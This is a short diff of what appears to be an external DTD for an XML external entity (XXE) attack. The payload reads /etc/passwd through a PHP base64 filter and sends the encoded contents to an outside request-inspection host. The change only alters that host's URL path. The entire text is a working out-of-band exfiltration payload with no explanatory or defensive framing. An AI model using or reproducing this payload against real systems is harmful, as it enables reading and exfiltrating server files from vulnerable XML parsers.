@@ -1,4 +1,4 @@
 <!ENTITY % payload SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
-<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'https://requestinspector.com/p/byk/%payload;'>">
+<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'https://requestinspector.com/inspect/byk/%payload;'>">
 %int;
 %trick;
